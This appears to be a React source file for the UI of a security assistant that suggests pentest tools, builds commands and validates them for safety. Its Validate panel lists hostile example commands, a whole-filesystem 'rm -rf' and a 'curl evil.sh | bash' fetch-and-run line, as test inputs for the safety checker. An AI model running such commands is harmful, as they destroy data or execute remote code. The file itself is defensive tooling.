/**
 * CyberSec Pro AI Assistant — Intelligent Security Co-Pilot.
 *
 * Vos-design migration. Six capabilities surfaced as tabbed panels:
 *   1. Suggest    — "Which tool should I use for X?"
 *   2. Playbook   — Multi-step workflow (recon → exploit → report)
 *   3. Command    — Build a safe command for a tool/target
 *   4. Explain    — Plain-English explanation of any tool/command
 *   5. Validate   — Static safety analysis of a command
 *   6. Interpret  — Summarise scan findings (paste JSON)
 */
import { useState } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import { useTranslation } from 'react-i18next';
import {
  Bot,
  Target,
  Workflow,
  Zap,
  Lightbulb,
  ShieldCheck,
  BarChart3,
  Sparkles,
  AlertTriangle,
  AlertOctagon,
  Check,
  Terminal,
} from 'lucide-react';

import { useDocumentTitle } from '../../hooks/useUtilities';
import { PageTransition } from '../../components/ui';
import {
  useAISuggestTools,
  useAIGenerateCommand,
  useAIPlaybook,
  useAIExplain,
  useAIValidateCommand,
  useAIInterpretResults,
} from '../../hooks/useApiQueries';
import {
  PageHeader,
  Section,
  StatusPill,
  KeyValueGrid,
} from '../../components/vos/Soc';

// ───── Types ─────────────────────────────────────────────────────────────
type Tab = 'suggest' | 'playbook' | 'command' | 'explain' | 'validate' | 'interpret';

interface ToolSuggestion {
  id: string;
  name: string;
  category: string;
  target_types: string[];
  use_cases: string[];
  example_command: string;
  danger_level: number;
}

interface SafetyResult {
  command: string;
  safe: boolean;
  warnings: Array<{ pattern: string; reason: string; severity: string }>;
  verdict: 'ok' | 'review' | 'blocked';
}

const TABS: Array<{ id: Tab; label: string; icon: typeof Bot; desc: string }> = [
  { id: 'suggest',   label: 'Suggest Tools', icon: Target,      desc: 'Which tool fits my goal?' },
  { id: 'playbook',  label: 'Playbook',      icon: Workflow,    desc: 'Multi-step workflow' },
  { id: 'command',   label: 'Build Command', icon: Zap,         desc: 'Safe command for target' },
  { id: 'explain',   label: 'Explain',       icon: Lightbulb,   desc: 'How does this work?' },
  { id: 'validate',  label: 'Validate',      icon: ShieldCheck, desc: 'Safety check a command' },
  { id: 'interpret', label: 'Interpret',     icon: BarChart3,   desc: 'Summarise findings' },
];

const DANGER_TONE: Record<number, 'success' | 'warning' | 'danger'> = {
  0: 'success', 1: 'warning', 2: 'danger',
};
const DANGER_LABEL: Record<number, string> = {
  0: 'Safe', 1: 'Intrusive', 2: 'Destructive',
};

const VERDICT_TONE: Record<string, 'success' | 'warning' | 'danger'> = {
  ok: 'success', review: 'warning', blocked: 'danger',
};
const VERDICT_LABEL: Record<string, string> = {
  ok: 'Safe to run', review: 'Review needed', blocked: 'Blocked',
};

// ─────────────────────────────────────────────────────────────────────────
// Page
// ─────────────────────────────────────────────────────────────────────────
export default function AIAssistantPage() {
  const { t } = useTranslation();
  useDocumentTitle(`${t('aiAssistant.title', 'AI Assistant')} — CyberSec Pro`);

  const [tab, setTab] = useState<Tab>('suggest');
  const [useLLM, setUseLLM] = useState(true);

  return (
    <PageTransition>
      <div className="p-vos-6 max-w-vos-page mx-auto space-y-vos-6">
        <PageHeader
          icon={Bot}
          title="CyberSec Pro AI"
          subtitle="Your security expert. Ask what tool to use, build safe commands, design multi-step playbooks, validate dangerous commands, and let AI interpret your scan findings."
          badge={<StatusPill tone="accent" label="Intelligent Co-Pilot" />}
          actions={
            <label className="flex items-center gap-2 h-9 px-vos-3 rounded-vos-md bg-vos-bg-elev-1 border border-vos-border-1 text-vos-sm text-vos-text-2 cursor-pointer hover:border-vos-accent/40 transition-colors">
              <input
                type="checkbox"
                checked={useLLM}
                onChange={(e) => setUseLLM(e.target.checked)}
                className="w-3.5 h-3.5 accent-vos-accent"
              />
              <Sparkles size={13} className="text-vos-accent" />
              LLM enrichment
              <span className="text-[11px] text-vos-text-3">(slower, smarter)</span>
            </label>
          }
        />

        {/* Tab grid */}
        <div className="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-6 gap-vos-2">
          {TABS.map((it) => {
            const active = tab === it.id;
            const Icon = it.icon;
            return (
              <button
                key={it.id}
                onClick={() => setTab(it.id)}
                className={`group flex items-start gap-vos-2 p-vos-3 rounded-vos-md border transition-colors text-left ${
                  active
                    ? 'bg-vos-accent/10 border-vos-accent/40 text-vos-accent ring-1 ring-vos-accent/30'
                    : 'bg-vos-bg-elev-1 border-vos-border-1 text-vos-text-2 hover:border-vos-border-2 hover:text-vos-text'
                }`}
              >
                <Icon size={16} className="mt-0.5 shrink-0" />
                <div className="min-w-0">
                  <div className="font-medium text-vos-sm">{it.label}</div>
                  <div className={`text-[11px] truncate ${active ? 'text-vos-accent/80' : 'text-vos-text-3'}`}>{it.desc}</div>
                </div>
              </button>
            );
          })}
        </div>

        <Section bodyClassName="min-h-[400px]" title={TABS.find((x) => x.id === tab)?.label ?? ''}>
          <AnimatePresence mode="wait">
            <motion.div
              key={tab}
              initial={{ opacity: 0, y: 8 }}
              animate={{ opacity: 1, y: 0 }}
              exit={{ opacity: 0 }}
              transition={{ duration: 0.18 }}
            >
              {tab === 'suggest'   && <SuggestPanel useLLM={useLLM} />}
              {tab === 'playbook'  && <PlaybookPanel useLLM={useLLM} />}
              {tab === 'command'   && <CommandPanel />}
              {tab === 'explain'   && <ExplainPanel useLLM={useLLM} />}
              {tab === 'validate'  && <ValidatePanel />}
              {tab === 'interpret' && <InterpretPanel useLLM={useLLM} />}
            </motion.div>
          </AnimatePresence>
        </Section>
      </div>
    </PageTransition>
  );
}

// ─────────────────────────────────────────────────────────────────────────
// Reusable form primitives (vos-styled)
// ─────────────────────────────────────────────────────────────────────────
function VosLabel({ children }: { children: React.ReactNode }) {
  return (
    <label className="block text-[10px] uppercase tracking-vos-wide font-semibold text-vos-text-3 mb-1.5">
      {children}
    </label>
  );
}

function VosInput(props: React.InputHTMLAttributes<HTMLInputElement>) {
  return (
    <input
      {...props}
      className={`w-full h-9 px-vos-3 rounded-vos-md bg-vos-bg-elev-3 border border-vos-border-1 text-vos-sm text-vos-text placeholder:text-vos-text-muted focus:outline-none focus:border-vos-accent focus:ring-2 focus:ring-vos-accent/30 transition-colors ${props.className ?? ''}`}
    />
  );
}

function VosTextarea(props: React.TextareaHTMLAttributes<HTMLTextAreaElement>) {
  return (
    <textarea
      {...props}
      className={`w-full px-vos-3 py-vos-2 rounded-vos-md bg-vos-bg-elev-3 border border-vos-border-1 text-vos-sm text-vos-text placeholder:text-vos-text-muted focus:outline-none focus:border-vos-accent focus:ring-2 focus:ring-vos-accent/30 transition-colors resize-y font-vos-sans ${props.className ?? ''}`}
    />
  );
}

function VosSelect(props: React.SelectHTMLAttributes<HTMLSelectElement>) {
  return (
    <select
      {...props}
      className={`h-9 px-vos-3 rounded-vos-md bg-vos-bg-elev-3 border border-vos-border-1 text-vos-sm text-vos-text focus:outline-none focus:border-vos-accent focus:ring-2 focus:ring-vos-accent/30 transition-colors ${props.className ?? ''}`}
    />
  );
}

function PrimaryButton({
  children, disabled, onClick, icon: Icon,
}: { children: React.ReactNode; disabled?: boolean; onClick?: () => void; icon?: typeof Bot }) {
  return (
    <button
      onClick={onClick}
      disabled={disabled}
      className="inline-flex items-center gap-1.5 h-9 px-vos-4 rounded-vos-md bg-vos-accent text-white text-vos-sm font-semibold hover:bg-vos-accent/90 disabled:opacity-50 disabled:cursor-not-allowed transition-colors"
    >
      {Icon && <Icon size={14} />}
      {children}
    </button>
  );
}

function ChipButton({ children, onClick }: { children: React.ReactNode; onClick: () => void }) {
  return (
    <button
      onClick={onClick}
      className="inline-flex items-center px-2.5 h-7 rounded-vos-sm bg-vos-bg-elev-2 text-vos-text-3 text-vos-xs border border-vos-border-1 hover:border-vos-border-2 hover:text-vos-text-2 transition-colors"
    >
      {children}
    </button>
  );
}

function CodeBlock({ children, className }: { children: React.ReactNode; className?: string }) {
  return (
    <code
      className={`block text-vos-xs bg-vos-bg-elev-3 text-vos-success px-vos-3 py-vos-2 rounded-vos-md border border-vos-border-1 overflow-x-auto whitespace-nowrap font-vos-mono ${className ?? ''}`}
    >
      {children}
    </code>
  );
}

function AICallout({ title, children }: { title: string; children: React.ReactNode }) {
  return (
    <div className="p-vos-3 rounded-vos-md bg-vos-accent/5 border border-vos-accent/20">
      <div className="text-[10px] uppercase tracking-vos-wide font-semibold text-vos-accent mb-1">{title}</div>
      <div className="text-vos-sm text-vos-text-2 whitespace-pre-wrap leading-relaxed">{children}</div>
    </div>
  );
}

// ─────────────────────────────────────────────────────────────────────────
// Panel: Suggest Tools
// ─────────────────────────────────────────────────────────────────────────
function SuggestPanel({ useLLM }: { useLLM: boolean }) {
  const [query, setQuery] = useState('');
  const [targetType, setTargetType] = useState('');
  const mut = useAISuggestTools();
  const result = mut.data as { suggestions?: ToolSuggestion[]; explanation?: string; source?: string } | undefined;

  const examples = [
    'I want to scan a WordPress site',
    'Find subdomains for bug bounty',
    'Test SSL configuration',
    'Check Docker image for CVEs',
    'Brute force SSH login',
    'Find leaked secrets in git repo',
  ];

  const submit = () => {
    if (!query.trim()) return;
    mut.mutate({ query: query.trim(), target_type: targetType || undefined, use_llm: useLLM });
  };

  return (
    <div className="space-y-vos-4">
      <div>
        <VosLabel>What do you want to do?</VosLabel>
        <VosTextarea
          value={query}
          onChange={(e) => setQuery(e.target.value)}
          onKeyDown={(e) => e.key === 'Enter' && e.ctrlKey && submit()}
          placeholder="e.g. I want to find SQL injection vulnerabilities in a login form…"
          rows={3}
        />
      </div>

      <div className="flex flex-wrap items-end gap-vos-3">
        <div>
          <VosLabel>Target type (optional)</VosLabel>
          <VosSelect value={targetType} onChange={(e) => setTargetType(e.target.value)}>
            <option value="">Any</option>
            <option value="url">URL</option>
            <option value="domain">Domain</option>
            <option value="ip">IP / CIDR</option>
            <option value="repository">Git repo</option>
            <option value="image">Container image</option>
            <option value="file">File</option>
          </VosSelect>
        </div>
        <PrimaryButton onClick={submit} disabled={mut.isPending || !query.trim()} icon={Target}>
          {mut.isPending ? 'Thinking…' : 'Suggest Tools'}
        </PrimaryButton>
        <span className="text-vos-xs text-vos-text-3">Ctrl+Enter to submit</span>
      </div>

      <div className="flex flex-wrap gap-vos-2">
        {examples.map((ex) => (
          <ChipButton key={ex} onClick={() => setQuery(ex)}>{ex}</ChipButton>
        ))}
      </div>

      {result?.explanation && (
        <AICallout title={`AI Analysis · ${result.source ?? 'engine'}`}>{result.explanation}</AICallout>
      )}

      {result?.suggestions && result.suggestions.length > 0 ? (
        <div className="grid md:grid-cols-2 gap-vos-3">
          {result.suggestions.map((tool) => (
            <div
              key={tool.id}
              className="p-vos-4 rounded-vos-lg bg-vos-bg-elev-1 border border-vos-border-1 hover:border-vos-accent/30 transition-colors"
            >
              <div className="flex items-start justify-between gap-2 mb-vos-2">
                <div>
                  <div className="font-semibold text-vos-text">{tool.name}</div>
                  <div className="text-vos-xs text-vos-text-3">{tool.category}</div>
                </div>
                <StatusPill
                  tone={DANGER_TONE[tool.danger_level] ?? 'neutral'}
                  label={DANGER_LABEL[tool.danger_level] ?? '—'}
                />
              </div>
              <div className="text-vos-xs text-vos-text-3 mb-vos-2">
                <span className="text-vos-text-muted">Best for: </span>
                {tool.use_cases.slice(0, 3).join(' • ')}
              </div>
              <div className="text-[10px] uppercase tracking-vos-wide text-vos-text-3 mb-1">Example</div>
              <CodeBlock>{tool.example_command}</CodeBlock>
              <div className="flex flex-wrap gap-1 mt-vos-2">
                {tool.target_types.map((tt) => (
                  <span
                    key={tt}
                    className="px-1.5 py-0.5 text-[10px] rounded-vos-sm bg-vos-bg-elev-2 border border-vos-border-1 text-vos-text-3"
                  >
                    {tt}
                  </span>
                ))}
              </div>
            </div>
          ))}
        </div>
      ) : mut.isSuccess ? (
        <p className="text-vos-text-3 text-vos-sm italic">No matching tools — try rephrasing your goal.</p>
      ) : null}
    </div>
  );
}

// ─────────────────────────────────────────────────────────────────────────
// Panel: Command Builder
// ─────────────────────────────────────────────────────────────────────────
function CommandPanel() {
  const [toolId, setToolId] = useState('nmap');
  const [target, setTarget] = useState('');
  const mut = useAIGenerateCommand();
  const r = mut.data as { command?: string; safety?: SafetyResult; tool?: ToolSuggestion } | undefined;

  const TOOL_OPTIONS = [
    'nmap', 'masscan', 'nikto', 'nuclei', 'wpscan', 'sqlmap', 'gobuster', 'ffuf', 'subfinder',
    'amass', 'httpx', 'sslscan', 'testssl', 'hydra', 'metasploit', 'zap', 'trivy', 'gitleaks', 'trufflehog',
  ];

  return (
    <div className="space-y-vos-4">
      <div className="grid md:grid-cols-2 gap-vos-3">
        <div>
          <VosLabel>Tool</VosLabel>
          <VosSelect value={toolId} onChange={(e) => setToolId(e.target.value)} className="w-full">
            {TOOL_OPTIONS.map((t) => <option key={t} value={t}>{t}</option>)}
          </VosSelect>
        </div>
        <div>
          <VosLabel>Target</VosLabel>
          <VosInput value={target} onChange={(e) => setTarget(e.target.value)} placeholder="example.com or 192.168.1.0/24" />
        </div>
      </div>
      <PrimaryButton
        disabled={!target.trim() || mut.isPending}
        onClick={() => mut.mutate({ tool_id: toolId, target: target.trim() })}
        icon={Zap}
      >
        {mut.isPending ? 'Building…' : 'Build Command'}
      </PrimaryButton>

      {r?.command && (
        <div className="space-y-vos-3">
          <div>
            <div className="text-[10px] uppercase tracking-vos-wide text-vos-text-3 mb-1">Generated command</div>
            <CodeBlock className="whitespace-pre-wrap break-words">{r.command}</CodeBlock>
          </div>
          {r.safety && <SafetyCard safety={r.safety} />}
        </div>
      )}
    </div>
  );
}

// ─────────────────────────────────────────────────────────────────────────
// Panel: Playbook
// ─────────────────────────────────────────────────────────────────────────
function PlaybookPanel({ useLLM }: { useLLM: boolean }) {
  const [goal, setGoal] = useState('');
  const [target, setTarget] = useState('');
  const mut = useAIPlaybook();
  const r = mut.data as
    | { steps?: Array<{ order: number; tool: string; purpose: string; command: string }>; rationale?: string }
    | undefined;

  const presets = ['Bug bounty recon', 'WordPress audit', 'Internal network pentest', 'SSL/TLS audit', 'API security test', 'Find leaked secrets'];

  return (
    <div className="space-y-vos-4">
      <div className="grid md:grid-cols-2 gap-vos-3">
        <div>
          <VosLabel>Goal</VosLabel>
          <VosInput value={goal} onChange={(e) => setGoal(e.target.value)} placeholder="e.g. Bug bounty recon" />
        </div>
        <div>
          <VosLabel>Target</VosLabel>
          <VosInput value={target} onChange={(e) => setTarget(e.target.value)} placeholder="example.com" />
        </div>
      </div>
      <div className="flex flex-wrap gap-vos-2">
        {presets.map((p) => (
          <ChipButton key={p} onClick={() => setGoal(p)}>{p}</ChipButton>
        ))}
      </div>
      <PrimaryButton
        disabled={!goal.trim() || !target.trim() || mut.isPending}
        onClick={() => mut.mutate({ goal: goal.trim(), target: target.trim(), use_llm: useLLM })}
        icon={Workflow}
      >
        {mut.isPending ? 'Designing…' : 'Generate Playbook'}
      </PrimaryButton>

      {r?.rationale && <AICallout title="Why this order">{r.rationale}</AICallout>}

      {r?.steps && r.steps.length > 0 && (
        <ol className="space-y-vos-2">
          {r.steps.map((step) => (
            <li
              key={step.order}
              className="p-vos-3 bg-vos-bg-elev-1 border border-vos-border-1 rounded-vos-md flex gap-vos-3"
            >
              <div className="shrink-0 w-8 h-8 bg-vos-accent/15 text-vos-accent rounded-full flex items-center justify-center font-bold text-vos-sm">
                {step.order}
              </div>
              <div className="flex-1 min-w-0">
                <div className="flex items-baseline justify-between gap-2 flex-wrap">
                  <span className="font-semibold text-vos-text">{step.tool}</span>
                  <span className="text-vos-xs text-vos-text-3">{step.purpose}</span>
                </div>
                <CodeBlock className="mt-1">{step.command}</CodeBlock>
              </div>
            </li>
          ))}
        </ol>
      )}
    </div>
  );
}

// ─────────────────────────────────────────────────────────────────────────
// Panel: Explain
// ─────────────────────────────────────────────────────────────────────────
function ExplainPanel({ useLLM }: { useLLM: boolean }) {
  const [mode, setMode] = useState<'tool' | 'command'>('tool');
  const [val, setVal] = useState('');
  const mut = useAIExplain();
  const r = mut.data as
    | { summary?: string; explanation?: string; deep_explanation?: string; tool?: ToolSuggestion; safety?: SafetyResult }
    | undefined;

  const submit = () => {
    if (!val.trim()) return;
    mut.mutate(mode === 'tool' ? { tool_id: val.trim(), use_llm: useLLM } : { command: val.trim(), use_llm: useLLM });
  };

  return (
    <div className="space-y-vos-4">
      <div className="flex gap-vos-2">
        {(['tool', 'command'] as const).map((m) => (
          <button
            key={m}
            onClick={() => setMode(m)}
            className={`px-3 h-8 rounded-vos-md text-vos-sm font-medium transition-colors capitalize ${
              mode === m
                ? 'bg-vos-accent/10 text-vos-accent ring-1 ring-vos-accent/30'
                : 'bg-vos-bg-elev-2 text-vos-text-3 border border-vos-border-1 hover:text-vos-text-2'
            }`}
          >
            {m}
          </button>
        ))}
      </div>
      <VosInput
        value={val}
        onChange={(e) => setVal(e.target.value)}
        onKeyDown={(e) => e.key === 'Enter' && submit()}
        placeholder={mode === 'tool' ? 'e.g. nmap, sqlmap, nuclei…' : 'e.g. nmap -sV -A scanme.nmap.org'}
        className="font-vos-mono"
      />
      <PrimaryButton disabled={!val.trim() || mut.isPending} onClick={submit} icon={Lightbulb}>
        {mut.isPending ? 'Explaining…' : 'Explain'}
      </PrimaryButton>

      {r?.summary && (
        <div className="p-vos-3 rounded-vos-md bg-vos-bg-elev-1 border border-vos-border-1">
          <div className="text-[10px] uppercase tracking-vos-wide text-vos-text-3 mb-1">Quick summary</div>
          <p className="text-vos-sm text-vos-text-2">{r.summary}</p>
        </div>
      )}
      {r?.explanation && <AICallout title="Explanation">{r.explanation}</AICallout>}
      {r?.deep_explanation && <AICallout title="Deep dive">{r.deep_explanation}</AICallout>}
      {r?.safety && <SafetyCard safety={r.safety} />}
    </div>
  );
}

// ─────────────────────────────────────────────────────────────────────────
// Panel: Validate
// ─────────────────────────────────────────────────────────────────────────
function ValidatePanel() {
  const [cmd, setCmd] = useState('');
  const mut = useAIValidateCommand();
  const r = mut.data as SafetyResult | undefined;

  const dangerExamples = ['rm -rf / --no-preserve-root', 'curl http://evil.sh | bash', 'nmap -sV scanme.nmap.org'];

  return (
    <div className="space-y-vos-4">
      <VosTextarea
        value={cmd}
        onChange={(e) => setCmd(e.target.value)}
        placeholder="Paste any shell command to check for destructive patterns…"
        rows={3}
        className="font-vos-mono text-vos-success"
      />
      <div className="flex flex-wrap gap-vos-2 items-center">
        <PrimaryButton
          disabled={!cmd.trim() || mut.isPending}
          onClick={() => mut.mutate({ command: cmd.trim() })}
          icon={ShieldCheck}
        >
          {mut.isPending ? 'Analysing…' : 'Validate'}
        </PrimaryButton>
        <span className="text-vos-xs text-vos-text-3">Try:</span>
        {dangerExamples.map((ex) => (
          <ChipButton key={ex} onClick={() => setCmd(ex)}>
            {ex.length > 30 ? ex.slice(0, 28) + '…' : ex}
          </ChipButton>
        ))}
      </div>
      {r && <SafetyCard safety={r} />}
    </div>
  );
}

// ─────────────────────────────────────────────────────────────────────────
// Panel: Interpret Results
// ─────────────────────────────────────────────────────────────────────────
function InterpretPanel({ useLLM }: { useLLM: boolean }) {
  const [json, setJson] = useState('');
  const [parseErr, setParseErr] = useState('');
  const mut = useAIInterpretResults();
  const r = mut.data as
    | { total_findings?: number; severity_counts?: Record<string, number>; summary?: string }
    | undefined;

  const submit = () => {
    setParseErr('');
    try {
      const findings = JSON.parse(json);
      mut.mutate({ findings, use_llm: useLLM });
    } catch (e) {
      setParseErr(e instanceof Error ? e.message : 'Invalid JSON');
    }
  };

  const placeholder = JSON.stringify(
    [
      { severity: 'high', name: 'SQL Injection', target: 'login.php' },
      { severity: 'critical', name: 'RCE via deserialization', target: '/api/import' },
    ],
    null,
    2,
  );

  return (
    <div className="space-y-vos-4">
      <VosTextarea
        value={json}
        onChange={(e) => setJson(e.target.value)}
        placeholder={`Paste findings JSON array, e.g.\n${placeholder}`}
        rows={10}
        className="font-vos-mono text-vos-xs"
      />
      {parseErr && (
        <div className="flex items-start gap-2 p-vos-3 rounded-vos-md bg-vos-danger/10 border border-vos-danger/30 text-vos-danger text-vos-sm">
          <AlertOctagon size={14} className="mt-0.5 shrink-0" />
          {parseErr}
        </div>
      )}
      <PrimaryButton disabled={!json.trim() || mut.isPending} onClick={submit} icon={BarChart3}>
        {mut.isPending ? 'Analysing…' : 'Interpret'}
      </PrimaryButton>

      {r && (
        <div className="space-y-vos-3">
          <KeyValueGrid
            cols={4}
            items={[
              { label: 'Total Findings', value: r.total_findings ?? 0 },
              ...Object.entries(r.severity_counts ?? {}).map(([sev, count]) => ({
                label: sev.charAt(0).toUpperCase() + sev.slice(1),
                value: count,
              })),
            ]}
          />
          {r.summary && <AICallout title="Analyst Summary">{r.summary}</AICallout>}
        </div>
      )}
    </div>
  );
}

// ─────────────────────────────────────────────────────────────────────────
// Shared: Safety card
// ─────────────────────────────────────────────────────────────────────────
function SafetyCard({ safety }: { safety: SafetyResult }) {
  const tone = VERDICT_TONE[safety.verdict] ?? 'warning';
  const label = VERDICT_LABEL[safety.verdict] ?? 'Review';
  const Icon = safety.verdict === 'ok' ? Check : safety.verdict === 'review' ? AlertTriangle : AlertOctagon;
  const borderClass =
    tone === 'success'
      ? 'border-vos-success/30 bg-vos-success/5'
      : tone === 'warning'
        ? 'border-vos-warning/30 bg-vos-warning/5'
        : 'border-vos-danger/30 bg-vos-danger/5';

  return (
    <div className={`p-vos-3 rounded-vos-md border ${borderClass}`}>
      <div className="flex items-center gap-vos-2 mb-vos-2">
        <Icon size={16} className={tone === 'success' ? 'text-vos-success' : tone === 'warning' ? 'text-vos-warning' : 'text-vos-danger'} />
        <StatusPill tone={tone} label={label} />
        {safety.warnings.length > 0 && (
          <span className="text-vos-xs text-vos-text-3">{safety.warnings.length} warning{safety.warnings.length === 1 ? '' : 's'}</span>
        )}
      </div>
      {safety.warnings.length > 0 && (
        <ul className="space-y-1.5 text-vos-xs">
          {safety.warnings.map((w, i) => (
            <li key={i} className="flex items-start gap-2">
              <span className={w.severity === 'critical' ? 'text-vos-danger mt-0.5' : 'text-vos-warning mt-0.5'}>●</span>
              <span className="text-vos-text-3">
                <code className="bg-vos-bg-elev-3 px-1.5 py-0.5 rounded-vos-sm text-vos-text-2 font-vos-mono">{w.pattern}</code>{' '}
                — {w.reason}
              </span>
            </li>
          ))}
        </ul>
      )}
      {safety.command && (
        <div className="mt-vos-3">
          <div className="flex items-center gap-1.5 text-[10px] uppercase tracking-vos-wide text-vos-text-3 mb-1">
            <Terminal size={11} /> Command
          </div>
          <CodeBlock className="whitespace-pre-wrap break-words">{safety.command}</CodeBlock>
        </div>
      )}
    </div>
  );
}
